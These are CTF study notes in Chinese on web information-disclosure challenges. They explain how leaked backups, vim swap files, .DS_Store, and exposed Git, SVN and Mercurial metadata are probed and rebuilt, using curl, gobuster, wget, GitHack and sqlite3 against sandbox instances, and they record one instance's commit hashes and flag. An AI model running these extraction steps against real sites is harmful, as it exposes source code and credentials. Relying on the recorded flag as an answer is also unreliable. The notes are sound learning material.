# 信息泄露漏洞

> 来源：task9 —— CTFHub 技能树 Web · 信息泄露模块
> 动手记录见 `../logs/2026-10-17.md`

---

## 一、这类漏洞的本质

**不是"绕过"，是"服务器上还留着不该留的文件"。**

```
开发者/运维图方便留下的东西（.git / .env / .bak / .swp / .DS_Store）
        ↓
它们被放在了 web 根目录下，HTTP 能直接读到
        ↓
攻击者拿到的是【服务器的目录结构 + 源码 + 凭据】
        ↓
这是整条攻击链的起点
```

**核心认知：**

| 误解 | 事实 |
|---|---|
| 隐藏文件（`.` 开头）就安全 | **HTTP 不看你的 `ls`**，`.git` 就是普通目录 |
| 删掉文件就没了 | git/svn 里对象只增不减，`git rm` 删不掉 |
| 信息泄露是低危 | 一份源码 = 所有硬编码密钥 = 数据库 = 服务器 |

## 二、五类泄露：探测 → 利用

### 2.1 备份文件下载（4 小题）

**四种载体：**

| 类型 | 路径形态 | 怎么找 | 怎么用 |
|---|---|---|---|
| **网站源码包** | `www.zip` `web.tar.gz` `backup.zip` | 页面给字典 or 爆破 | 解压 → `grep -r` |
| **后缀变体备份** | `index.php.bak` `config.php.old` `index.php~` | 对已知文件名加后缀 | 直接读（不解析） |
| **vim 交换文件** | `.index.php.swp` | 固定思路 | `grep -a` / `vim -r` |
| **macOS 元数据** | `.DS_Store` | 固定路径 | 解析出文件名 → 访问 |

**① 网站源码**

```bash
# 页面通常直接给字典（7 个名字 × 4 个后缀）
gobuster dir -u "$T/" -w ~/wordlists/backup-all.txt -q

# 拿下之后：文件名本身也是线索
unzip www.zip -d out
find out -type f | sed 's|^out/||' | while read -r p; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$T/$p")
  echo "$code  /$p"
done
```

> **关键**：zip 里的 `flag_1234567890.txt` 内容是 "where is flag ??" —— **提示的是文件名，真 flag 在 `/flag_1234567890.txt`**。
> 随机数字后缀是为了防抄 wp，每个人都不一样。

**② `.bak` 为什么能泄露源码（原理）**

服务器**按扩展名**决定要不要交给 PHP 解析：

```
GET /index.php       → 扩展名 .php → 交给 PHP-FPM 执行 → 只返回 echo 的输出
GET /index.php.bak   → 扩展名 .bak → 当静态文件         → 原封不动吐出来
```

**位置很重要**：

| 文件名 | 最后扩展名 | 结果 |
|---|---|---|
| `index.php.bak` | `.bak` | ✅ 泄露 |
| `index.bak.php` | `.php` | ❌ 被解析，不泄露 |
| `index_backup.php` | `.php` | ❌ 被解析 |

**③ vim 交换文件**

```bash
curl -s -O "$T/.index.php.swp"
head -c 16 .index.php.swp | od -A x -t x1z     # 魔数 b0VIM + 版本
grep -ao "flag{[^}]*}" .index.php.swp          # 最快
vim -r .index.php.swp                          # 最完整，但可能截断
```

**三种取法的可靠性（实测结论）：**

| 方法 | 可靠性 | 说明 |
|---|---|---|
| `grep -a` | ⭐⭐⭐ | swap 不加密，直接搜明文 |
| `strings` | ⭐⭐ | 顺带能拿到**服务器绝对路径**和运行用户 |
| `vim -r` | ⚠️ | **数据块可能只写了一半 → 恢复出来是残缺的** |

> **认知修正**：不是"必须用 `vim -r`"。swap 是按块异步写的，崩溃时可能只写了一半，`grep` 反而更完整。

**命名规则**（`swp` → `swo` → `swn` 依次递减）：

```
.swp  第 1 个 vim 会话
.swo  第 2 个
.swn  第 3 个
.un~  持久化 undo
~     备份文件
```

**④ `.DS_Store`**

```bash
curl -s -O "$T/.DS_Store"
head -c 32 .DS_Store | od -A x -t x1z        # 签名: \x00\x00\x00\x01 Bud1
pip install --break-system-packages ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('.DS_Store','r') as d:
    for e in d: print(e.filename)
"
```

**记录结构（重要）：**

```
┌─────────────┬──────────┬──────────┬──────────────┐
│  filename   │   code   │   type   │    value     │
├─────────────┼──────────┼──────────┼──────────────┤
│ 74430ae6... │  'note'  │  'ustr'  │ 'flag here!' │
│   .txt      │ (注释)   │ (UTF-16) │   ← 诱饵     │
└─────────────┴──────────┴──────────┴──────────────┘
      ↑             ↑          ↑            ↑
   真实文件名   属性类型   数据类型      实际内容
```

> **只要 `filename`，不要 `value`。** 出题人会把假 flag 写进 `value`（Finder 注释）里骗人。
> **不要手写 UTF-16 启发式扫描** —— DS_Store 是 Buddy Allocator 二进制格式，手写会漏真名字 + 误报假线索。

### 2.2 Git 泄露（Log）

> 以下流程 2026-10-18 在实例 `challenge-41019ce7441deaee` 上完整走通。

**四条命令（主体）：**

```bash
# ── 0. 目标 ──
T="http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800"

# ── 1. 探测 ──
curl -s "$T/.git/HEAD"                                          # ref: refs/heads/master
curl -s "$T/.git/logs/HEAD"                                     # 三次提交 + 哈希
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"     # 403 → 走 GitHack

# ── 2. 搬运 ──
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"

# ── 3. 进仓库 ──
cd dist/challenge-41019ce7441deaee.sandbox.ctfhub.com_10800

# ── 4. 挖 flag ──
git show 4d330484
```

**本次实例的关键数据：**

| 项 | 值 |
|---|---|
| `init` | `4914b07da16e2dd74f2ff2ce4593355319f2b4d3` |
| **`add flag`** | **`4d33048430db519e855d8a83c31036db29481b4c`** ★ |
| `remove flag` | `94425515342b0fdd3d0b77629a7f4e9a42519502` |
| flag 文件名 | `6654926415002.txt` |
| flag | `ctfhub{d57b85603ca77329a3ae5a18}` |

#### 第 1 步：探测三连

```bash
curl -s "$T/.git/HEAD"                                        # ① 有没有 .git
curl -s "$T/.git/logs/HEAD"                                   # ② 三次提交的哈希 + 说明
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"   # ③ 走哪条路线
```

**② 的返回怎么读 —— 取 `commit: add flag` 那行的第二列：**

```
<旧哈希>  <新哈希>  <作者> <邮箱> <时间戳> <时区>  <动作>: <说明>
    │        │
    │        └─ 这次动作【之后】指向的提交  ★ 要这一列
    └─ 这次动作【之前】指向的提交

0000...0000  4914b07d...  commit (initial): init
4914b07d...  4d330484...  commit: add flag          ★ 取 4d330484
4d330484...  94425515...  commit: remove flag
```

**自洽检查**：同一个提交在相邻两行出现两次（上一行的"新" = 下一行的"旧"），对得上才说明 reflog 完整。

| 现象 | 原因 |
|---|---|
| `404` / 返回 HTML | 没有 `.git`，换题型 |
| `curl: (7)` | 靶场过期 / `$T` 拼错 → `echo $T` |
| 第②条为空 | reflog 被清过，改从 `.git/index` 拿 blob 哈希 |

---

#### 第 2 步：搬运 —— 状态码决定路线

| `objects/` | 路线 | 依赖 |
|---|---|---|
| **200**（能列目录） | A · `wget -r` 爬树 | 只要 `wget` |
| **403 / 404**（不能列） | B · GitHack 按哈希取 | GitHack + `python2` |

**路线 A（200）：**

```bash
wget -q -r -np -nH --cut-dirs=1 -R "index.html*" "$T/.git/" -P ./dumped
```

⚠️ **两个坑：**
- `-R "index.html*"` 不能省 —— 目录列表页会生成 `index.html`，不排除会污染仓库
- **`--cut-dirs=1` 会把 `.git` 这一层削掉** → `dumped/` 里的内容**就是 `.git` 本身**，不是 `dumped/.git/`
  ```bash
  mkdir -p repo && mv dumped repo/.git     # 改成标准布局
  git -C repo log --all --oneline
  ```

**路线 B（403 / 404）：**

```bash
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
```

**必须 `python2`** —— 它是 2017 年的 Py2 代码（`import urlparse`），`python3` 会 `ModuleNotFoundError`。

它内部两套方案自动降级：能列目录就爬树，不能列就读 `index` / `logs/HEAD` 拿哈希再按哈希取。

#### 第 3 步：进仓库

**git 是"就近找 `.git`"的** —— 从当前目录往上找，找不到就报：

```
fatal: not a git repository (or any of the parent directories): .git
```

**GitHack 的产物目录名 = `netloc` 里的 `:` 换成 `_`：**

```
http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800
        ↓
challenge-41019ce7441deaee.sandbox.ctfhub.com_10800
```

**所以 `cd dist/$T` 不行**（URL 不是目录名）。三种正确写法：

```bash
# ① sed 转换（和 GitHack 源码同一规则）
D=$(echo "$T" | sed -e 's|https\?://||' -e 's|:|_|')

# ② bash 内置换（最快）
D=${T#http://}; D=${D#https://}; D=${D//:/_}

# ③ 通配符（只在 dist/ 里只有一个目标时安全，多个会 too many arguments）
```

**最省事：`git -C`，不用 cd**

```bash
git -C ~/tools/githack/GitHack-master/dist/"$D" show 4d330484
```

#### 第 4 步：挖 flag（五选一）

| # | 命令 | 输出 | 改工作区 |
|---|---|---|---|
| 1 | `git log --all -p \| grep -i ctfhub` | 全历史里带 flag 的行（±） | ❌ |
| 2 | `git show <add-flag哈希>` | 那一次提交的 diff | ❌ |
| 3 | `git diff <init> <add-flag>` | 两版本差异，**最干净** | ❌ |
| 4 | `git show <哈希>:<文件名>` | **文件原文**，连 checkout 都不用 | ❌ |
| 5 | `git checkout <哈希> -- .` | 恢复到工作区 | ✅ |

**不知道哈希就用相对位置：**

```bash
git show HEAD        # remove flag
git show HEAD~1      # add flag    ★
git show HEAD~2      # init
```

#### 补充 A：短哈希规则（实测）

| 输入位数 | 结果 |
|---|---|
| 40 / 12 / 10 / 7 / 5 / **4** | ✅ 能解析（只要在对象库里**唯一**） |
| **3 / 2 / 1** | ❌ `fatal: Needed a single revision` |

- **4 位是硬下限**（git 源码 `MINIMUM_ABBREV = 4`），少于 4 位会被当"引用名"解析，不是哈希
- 前缀不唯一 → `error: short object ID xxx is ambiguous`
- 大写也认（`95956B3` ✅）
- **`git log --oneline` 默认输出 7 位**，直接复制即可
- 规范化：`git rev-parse --short <哈希>` → 7 位

**bash 的 Tab 补全不认哈希**（只补文件名/命令/分支），哈希得自己复制。

`dist/<目标>/` 已存在时它**跳过下载，只做验证**。

#### 补充 C：三层"能看到" —— 为什么 `ls` 空空如也

```
① 工作区       ls                               ← 只有 HEAD 那个版本的文件
② index        git ls-files --stage             ← 暂存区登记的文件
③ 对象库       git cat-file --batch-all-objects  ← 所有对象（最全）
```

**GitHack 只做两件事：**

| 做了 | 没做 |
|---|---|
| ✅ 把对象下载到 `.git/objects/` | ❌ 不会把 stash / 旧提交 checkout 出来 |
| ✅ `git reset --hard HEAD` 摆出工作区 | ❌ 不会告诉你 flag 在哪 |

**所以 `ls` 只打开第 ① 层抽屉；flag 常常在第 ③ 层。**

**万能兜底（不管 flag 藏在 commit / stash / index / 悬空对象）：**

```bash
git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' \
  | awk '$1=="blob"{print $2}' \
  | while read -r h; do
      out=$(git cat-file -p "$h" 2>/dev/null | grep -oE '(ctfhub|flag)\{[^}]*\}' | head -1)
      [ -n "$out" ] && echo "★ blob $h → $out"
    done
```

**⚠️ `git fsck --unreachable` 找不到 index 里的 blob** —— 因为 index 也算"引用"，被它指向的对象是"可达"的，不算悬空。

**取单个文件原文（不用 checkout）：**

```bash
git show '<哈希>:<文件名>'        # 相对仓库根，不带 ./ 或 /
```

**冒号取内容，`--` 过滤 diff —— 别混：**

| 写法 | 输出 |
|---|---|
| `git show 'rev:path'` | **文件原文** |
| `git show rev -- path` | 该路径的 **diff** |

### 2.3 SVN 泄露

**起因**：在 web 目录 `svn checkout` 部署，`.svn` 留在 web 根。
（`svn export` 不带 `.svn`，是安全的部署方式）

**两代结构完全不同：**

| 版本 | `.svn` 位置 | 元数据 | 内容 |
|---|---|---|---|
| ≤ 1.6 | 每个子目录都有 | `entries`（**纯文本，有文件列表**） | `text-base/<名字>.svn-base` |
| ≥ 1.7 | 只有根目录 | `wc.db`（**SQLite**） | `pristine/<sha1前2位>/<sha1>.svn-base` |

**判断是哪一代：**

```bash
curl -s "$T/.svn/entries"                                  # 内容是 "12" 这种纯数字 → 1.7+
curl -s -o /dev/null -w "%{http_code}\n" "$T/.svn/wc.db"   # 200 → 1.7+
```

#### 1.7+ 打法（2026-10-20 实测）

```bash
curl -o wc.db "$T/.svn/wc.db"       # ★ 二进制，必须 -o，否则 curl 报警告

sqlite3 wc.db ".tables"
# ACTUAL_NODE LOCK NODES_BASE PRISTINE WCROOT WORK_QUEUE
# EXTERNALS   NODES NODES_CURRENT REPOSITORY WC_LOCK

# ★ 关键：PRISTINE 表的 refcount
sqlite3 wc.db "SELECT checksum, size, refcount FROM PRISTINE;"
#   $sha1$bf45c36a... | 221 | 1     ← index.html（还在用）
#   $sha1$0b4474e3... |  33 | 0     ← ★ 被删掉的旧版本
```

**`refcount` 的含义：**

| refcount | 含义 |
|---|---|
| ≥ 1 | 有工作副本文件引用它 |
| **0** | **没有任何 NODES 引用 —— 被删掉的旧版本残留** ★ |

**⚠️ 只看 `NODES` 会漏：**

```sql
SELECT local_relpath, checksum FROM NODES WHERE kind='file';
#   index.html     | $sha1$bf45c36a...
#   flag_xxx.txt   | （空）              ← presence='not-present'，checksum 是空的
```

**被删的文件 `presence='not-present'`、`checksum` 为空。**

**取内容：**

```bash
curl -s "$T/.svn/pristine/0b/0b4474e3aada84def80c35dfffcce4818f515673.svn-base"
```

**四行版（连探测一起）：**

```bash
T="http://challenge-xxx:10800"
curl -o wc.db "$T/.svn/wc.db"
for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//'); do
  curl -s "$T/.svn/pristine/${h:0:2}/${h}.svn-base"
done | grep -a ctfhub
```

#### 1.6 打法

```bash
curl -s "$T/.svn/entries"                        # 纯文本，有文件名
curl -s "$T/.svn/text-base/<文件名>.svn-base"     # 内容
```

**`checksum` 带 `$sha1$` 前缀，拼 URL 时要去掉。**

### 2.4 HG（Mercurial）泄露

**`.hg/requires` 返回 200 就是它。**

```bash
curl -s "$T/.hg/requires"
# dotencode / fncache / generaldelta / revlogv1 / sparserevlog / store
```

**`.hg/` 目录 403（不能列），但具体文件都能按路径取。**

#### 三个关键文件（2026-10-20 实测）

| 文件 | 作用 | 实测 |
|---|---|---|
| `.hg/last-message.txt` | 最后一次 commit message | `add flag`（8 字节） |
| **`.hg/store/fncache`** | **文件清单缓存**（每行一个 store 路径） | `data/index.html.i` 等 |
| **`.hg/dirstate`** | 当前文件列表（二进制，里面就有文件名） | `strings` 出 `flag_xxx.txt` |

```bash
curl -s "$T/.hg/dirstate" | strings | grep -E '\.(txt|php|py)$'
```

#### 内容存在哪：revlog

```
.hg/store/data/<编码后的文件名>.i
```

**⚠️ 最大的坑：文件名要编码**

Mercurial 的 store 把 `_` 当转义符：

| 字符 | 编码 |
|---|---|
| 大写 `A-Z` | `_` + 小写 |
| **`_`** | **`__`** ★ |
| 开头 `.` 或空格 | `~2e` / `~20` |

**实测：**

```
fncache 里写着：  data/flag_807728508.txt.i
实际路径是：      data/flag__807728508.txt.i    ← 双下划线
按 fncache 取  → 404
改成双下划线   → 200
```

#### revlog 里的数据带标记字节

```
75 63 74 66 68 75 62 7b ...
└┬┘ └──────────┬──────────┘
'u'      ctfhub{...
```

| 首字节 | 含义 |
|---|---|
| `'u'` (0x75) | 后面是**原文** |
| `'x'` (0x78) | 后面是 **zlib** |
| `0x00` | 原文（无标记） |

**所以直接 `zlib.decompress` 会报 `incomplete or truncated stream` —— 它是明文不是压缩的。**

#### 最简打法

```bash
# ① 判题型
curl -s "$T/" | grep -o '<title>[^<]*</title>'

# ② 拿文件名
curl -s "$T/.hg/dirstate" | strings | grep -E '\.txt$'

# ③ 名字里 _ 换成 __，取内容
curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
```

#### 想用 hg 命令（更省心）

```bash
sudo apt install mercurial

for p in requires dirstate store/00changelog.i store/00manifest.i store/fncache \
         store/undo undo.dirstate undo.desc undo.branch \
         store/data/index.html.i store/data/50x.html.i; do
  curl -s --create-dirs -o ".hg/$p" "$T/.hg/$p"
done
curl -s -o ".hg/store/data/flag__807728508.txt.i" "$T/.hg/store/data/flag__807728508.txt.i"

hg --repository . log                              # 看提交
hg --repository . cat -r 1 flag_807728508.txt      # → flag
```

### 2.6 三种版本库是同一类（Git / SVN / HG）

**同一根因**：用 `clone` / `checkout` 部署，版本控制元数据目录留在 web 根。
**同一流程**：探测 → 拿清单 → 按路径取内容 → 解码。

| 环节 | **Git** | **SVN** | **HG** |
|---|---|---|---|
| 元数据目录 | `.git/` | `.svn/` | `.hg/` |
| **入口探测** | `.git/HEAD` | `.svn/entries` / `.svn/wc.db` | `.hg/requires` |
| **历史** | `logs/HEAD`（reflog） | `wc.db: NODES` | `store/00changelog.i` |
| **文件清单** | `index` / `tree` / `refs/` | `wc.db: NODES.local_relpath` | `store/fncache` + `dirstate` |
| **内容路径** | `objects/<h[:2]>/<h[2:]>` | `pristine/<h[:2]>/<h>.svn-base` | `store/data/<编码名>.i` |
| **路径由什么决定** | **内容哈希** | **内容哈希** | **文件名编码** ★ |
| **内容编码** | zlib | 原文 | zlib 或 `'u'`+原文 |
| **目录列表** | `.git/objects/` 403 | `.svn/pristine/` 403 | `.hg/store/` 403 |
| **工具** | GitHack | rip-svn.pl | rip-hg.pl |
| **兜底扫描** | `cat-file --batch-all-objects` | 遍历 `PRISTINE` 表 | 遍历 `fncache` |

**关键差异只有三条：**

**① 清单从哪来**

| | 来源 | 怎么读 |
|---|---|---|
| Git | `reflog` + `index` + `refs/` | `git log --all` / `ls-files --stage` |
| SVN | `wc.db`（SQLite） | `sqlite3 wc.db "SELECT ..."` |
| HG | `fncache`（文本）+ `dirstate`（二进制） | `cat` / `strings` |

**② 内容路径怎么拼**

| | 规则 | 要知道什么 |
|---|---|---|
| **Git / SVN** | **内容哈希 → `<前2位>/<后38位>`** | 只要哈希，**不需要文件名** |
| **HG** | **文件名编码后的路径** | **必须知道文件名**，且 `_` → `__` |

**③ 内容怎么解**

| | 编码 | 解 |
|---|---|---|
| Git | zlib | `zlib.decompress()` |
| SVN | 原文 | 直接读 |
| HG | 看首字节 | `'u'`=原文 / `'x'`=zlib / `0x00`=原文 |

**统一的四步：**

```bash
# ① 探测：一条命令判版本库
for p in .git/HEAD .svn/entries .svn/wc.db .hg/requires; do
  printf "%-18s %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' "$T/$p")"
done

# ② 拿清单（三者各自的文件）
# Git: logs/HEAD + index
# SVN: wc.db → sqlite3
# HG:  store/fncache + dirstate

# ③ 取内容
# Git: curl "$T/.git/objects/${h:0:2}/${h:2}"
# SVN: curl "$T/.svn/pristine/${h:0:2}/${h}.svn-base"
# HG:  curl "$T/.hg/store/data/<编码名>.i"

# ④ 抓 flag
grep -aoE '(ctfhub|flag)\{[^}]*\}'
```

**一个记忆法：**

> **三个版本库的差别只在"书名目录怎么记" —— 取书的动作是一样的。**
>
> **Git/SVN 按"内容指纹"找书（哈希），HG 按"书名"找书（文件名编码）。**

## 三、这套流程为什么成立

三件事支撑了上面的四步流程：

| 事实 | 作用 |
|---|---|
| **哈希 = 路径**（`.git/objects/<h[:2]>/<h[2:]>`） | 403 下也能按哈希精确取对象 |
| **对象是 zlib 压缩的** | GitHack 帮你解压；手工取要 `zlib.decompress()` 再切 `\0` |
| **`git rm` 不删对象** | 只让新 tree 不再指向它，blob 永久留在 objects 里 |

**彻底删除必须两步**：`git reflog expire --expire=now --all` + `git gc --prune=now`。
**绝大多数人只做 `git rm`** —— 这就是 99% 的 Git 泄露还能挖到东西的原因。

**推论：工具的职责只是"搬运"** —— 把远程 `.git/objects/` 弄到本地。`git show` 是纯本地命令，一个网络请求都不发；对象不齐它就报 `Could not read <父提交哈希>`。

## 七、一句话总结每类

| 类型 | 一句话 |
|---|---|
| 网站源码 | 页面给字典 → 枚举 → 解压 → **文件名当 URL 试一遍** |
| bak 文件 | 文件名已知 → 加后缀；`.bak` 不被解析所以裸奔 |
| vim 缓存 | `.文件名.swp` → **`grep -a` 优先**，`vim -r` 次之 |
| .DS_Store | 解析出文件名 → 挨个访问（**只取 filename，不看 value**） |
| Git Log | `logs/HEAD` 拿哈希 → 按哈希取 → `git log --all -p \| grep` |
| Git Stash | `git stash list` → `stash show -p` |
| Git Index | `ls-files --stage` → `cat-file -p <hash>` |
| SVN | 1.6 读 `entries`+`text-base`；1.7 读 `wc.db`+`pristine` |
| HG | `.hg/requires` → `hg log` / `strings 00changelog.i` |
